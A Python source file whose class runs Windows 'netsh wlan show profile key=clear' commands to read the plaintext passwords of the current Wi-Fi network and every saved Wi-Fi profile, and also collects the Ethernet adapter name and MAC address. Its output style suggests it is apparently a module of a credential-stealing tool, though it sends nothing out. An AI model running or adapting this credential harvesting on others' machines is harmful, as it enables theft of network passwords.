import subprocess
import re

class WifiKeyRetriever():

    def retrievecurrentnet(self):
        try:
            netout = ((re.findall('SSID \d : .*?\\\\', str(subprocess.Popen('netsh wlan show networks', stdout=subprocess.PIPE).stdout.read()))[0]).split(':'))[1].replace('\\','').strip()
            netkey = (re.findall('(?:Contenuto chiave\s*: )(.*)', str(subprocess.Popen('netsh wlan show profile "' + netout + '" key=clear', stdout=subprocess.PIPE).stdout.read()))[0]).split('\\')[0]
            if netout and netkey:
                wifimessage = '--> Current WI-FI network:\n\n' + f'[+] WI-FI SSID: {netout}\n    WI-FI Pass: {netkey}'
        except:
            wifimessage = ''

        try:
            output = subprocess.check_output("ipconfig /all", shell=True, encoding="cp1252")

            lines = output.splitlines()

            description = ""
            physical_address = ""
            for line in lines:
                if "Description" in line:
                    description = line.split(":")[-1].strip()
                elif "Physical Address" in line:
                    physical_address = line.split(":")[-1].strip()

            if description and physical_address:
                ethermessage = '--> Current Ethernet network:\n\n' + f"[+] Description: {description}\n    Physical Address: {physical_address}\n\n"
            else:
                pass
        except:
            ethermessage = ''
            nothingmessage = '--> Current network:\n\n' + 'Currently not connected to any WI-FI\nNote that it could be an hotspot that has been unable to read\n\n'

        if wifimessage:
            return wifimessage
        elif ethermessage:
            return ethermessage
        else:
            return nothingmessage

    def retrievenetkeys(self):
        netout = ((re.findall('(?:    Tutti i profili utente\s*: )(.*)', str(subprocess.Popen('netsh wlan show profiles', stdout=subprocess.PIPE).stdout.read())))[0]).split('\\')
        netlist = [ssid.replace('Tutti i profili utente','').replace(':','').replace('n   ','').strip() for ssid in netout if len(ssid) > 1 and ssid != 'n"']
        netkeys = []
        for ssid in netlist:
            try:
                key = (re.findall('(?:Contenuto chiave\s*: )(.*)', str(subprocess.Popen('netsh wlan show profile "' + ssid + '" key=clear', stdout=subprocess.PIPE).stdout.read())))
                if len(key) > 0:
                    key = key[0].split('\\')[0]
                else:
                    key = 'Open Wi-fi network'
                netkeys.append(key)
            except Exception as error:
                netkeys.append('Unable to retrieve password. -' + ' Error: ' + str(error))

        message = '--> All WI-FIs and related passwords:\n'
        for ssid, password in zip(netlist, netkeys):
            message += f'\n[+] WI-FI SSID: {ssid}\n    WI-FI Pass: {password}\n'
        return message[:-1]